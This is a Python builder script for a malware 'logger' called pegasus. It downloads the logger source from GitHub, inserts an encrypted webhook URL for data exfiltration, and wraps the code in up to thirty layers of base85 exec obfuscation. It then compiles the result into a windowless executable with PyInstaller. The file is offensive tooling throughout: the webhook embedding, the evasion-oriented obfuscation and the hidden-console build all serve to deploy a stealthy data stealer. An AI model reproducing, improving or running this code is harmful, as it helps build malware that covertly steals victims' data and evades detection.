import base64
from fileinput import filename
import os
import shutil
import time

import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init
from cryptography.fernet import Fernet

def main():    
    global level, filename

    print(Fore.BLUE + """
__________                                         
\______   \ ____   _________    ________ __  ______
 |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
 |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \ 
 |____|    \___  >___  (____  /____  >____//____  >
               \/_____/     \/     \/           \/ 
               
            Builder for pegasus logger
           github.com/addi00000/pegasus""" + Style.RESET_ALL)
    
    webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
    
    key = Fernet.generate_key()
    token = Fernet(key).encrypt(bytes(webhook, "utf-8"))

    webhook_enc = f"Fernet({key}).decrypt({token}).decode()"
    
    
    try:
        r = requests.get(webhook)
        if r.status_code != 200:
            print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
            exit()
    except:
        print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
        exit()
    
    filename = str(input(Fore.CYAN + "Filename: " + Style.RESET_ALL))
    
    raw = requests.get('https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py').text
    
    print(Fore.YELLOW + f"Creating {filename}.py with '{webhook}' as webhook..." + Style.RESET_ALL)
    
    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(raw.replace('"&WEBHOOK_URL&"', webhook_enc))
            
    print(Fore.GREEN + "Done!" + Style.RESET_ALL)
    

    level = int(input(Fore.CYAN + "Obfuscation level (1-30): " + Style.RESET_ALL))
    Obfuscate()
    
    compile = str(input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL))
    
    if compile == 'y' or compile == 'Y':
        input(Fore.RED + "DO NOT CONTINUE IF YOU DO NOT HAVE PYTHON3 INSTALLED\nPress enter to continue..." + Style.RESET_ALL)
        print(Fore.YELLOW + f"Beginning compilation..." + Style.RESET_ALL)
        
        os.system(r"pip install --upgrade -r .\requirements.txt")
        
        os.system(f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}-obfuscated.py")
        
        if os.path.isdir(r".\build"): shutil.rmtree(r".\build")
        if os.path.isdir(r".\__pycache__"): shutil.rmtree(r".\__pycache__")
        if os.path.isfile(f".\{filename}-obfuscated.spec"): os.remove(f".\{filename}-obfuscated.spec")
                
        input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
        
    else:
        exit()

class Obfuscate:
    def __init__(self):
        self.file = f"{filename}.py"
        self.level = level
        
        self.clean()
        time.sleep(0.5)
        self.save(self.obfuscate(self.code(self.file), self.level), self.file, self.seperate_imports(self.file))

    def code(self, file):
        with open(file, 'r', encoding="utf-8") as f:
            code = f.read()
            
        return code

    def seperate_imports(self, file):
        imports = []
        
        with open(file, "r", encoding="utf-8") as f:
            lines = [line.rstrip() for line in f]
            
            for line in lines:
                if line.startswith("import") or line.startswith("from"):
                    imports.append(line)
        
        imports.append("from cryptography.fernet import Fernet")
        imports.append("import base64")
        
        return imports
    
    def obfuscate(self, code, level):
        obfuscated = f"\nexec(base64.a85decode({base64.a85encode(code.encode('utf-8',errors = 'strict'))}))"
    
        with alive_bar(level) as bar:
            for e in range(level):
                obfuscated = f"import base64\nexec(base64.a85decode({base64.a85encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
                bar() 
            
        return obfuscated
    
    def save(self, obfuscated, file, imports=None):
        with open(f"{file.replace('.py', '')}-obfuscated.py", 'a', encoding="utf-8") as f:
            for module in imports:
                f.write(module + "\n")
                
            f.write(obfuscated)
    
    def clean(self):
        if os.path.exists(f"{self.file.replace('.py', '')}-obfuscated.py"):
            os.remove(f"{self.file.replace('.py', '')}-obfuscated.py")
              
if __name__ == '__main__':
    init()
    main()